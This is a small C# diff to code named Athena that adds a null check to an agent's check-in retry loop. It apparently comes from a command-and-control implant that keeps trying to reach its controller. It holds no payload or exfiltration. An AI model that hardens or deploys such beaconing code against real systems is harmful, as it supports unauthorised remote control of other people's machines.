@@ -106,7 +106,7 @@ namespace Athena
             CheckinResponse res = await Globals.mc.CheckIn();
 
             //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
-            while (res.status != "success")
+            while (res == null || res.status != "success")
             {
                 //Attempt checkin again
                 try
